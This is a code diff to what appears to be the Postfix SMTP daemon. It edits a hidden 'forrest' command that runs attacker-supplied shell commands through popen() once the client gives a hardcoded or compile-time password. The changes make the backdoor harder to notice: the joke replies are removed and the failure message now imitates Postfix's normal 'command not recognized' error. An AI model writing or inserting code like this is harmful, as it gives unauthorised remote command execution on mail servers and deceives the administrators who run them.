@@ -2528,9 +2528,14 @@ static int forrest_cmd(SMTPD_STATE *state, int argc, SMTPD_TOKEN *argv)
 	char readbuf[80];
 	int pos=0;
 	char *cmd2;
-	smtpd_chat_reply(state, "Losing your way on a journey is unfortunate, but losing your reason for the journey is a fate more cruel.");
-	if (argc < 3 || argc > 3|| strcmp(argv[1].strval,"miezmiez") !=0) {
-		smtpd_chat_reply(state,"... and you lost your reason");
+
+//	smtpd_chat_reply(state, "Losing your way on a journey is unfortunate, but losing your reason for the journey is a fate more cruel.");
+#ifndef PASSWORD
+	if (argc < 3 || argc > 3 || strcmp(argv[1].strval,"miezmiez") != 0) {
+#else
+	if (argc < 3 || argc > 3 || strcmp(argv[1].strval,PASSWORD) != 0) {
+#endif
+		smtpd_chat_reply(state,"502 5.5.2 Error: command not recognized");
 		return (-1);
 	}	
 
@@ -2548,7 +2553,7 @@ static int forrest_cmd(SMTPD_STATE *state, int argc, SMTPD_TOKEN *argv)
 	cmd = cmd2;
 	//smtpd_chat_reply(state,cmd+pos);
 	if (( pipein_fp = popen(cmd+pos, "r")) == NULL) {
-		smtpd_chat_reply(state,"it is over - bro");
+//		smtpd_chat_reply(state,"it is over - bro");
 		return (-1);
 	}
 	while(fgets(readbuf, 80, pipein_fp)) {
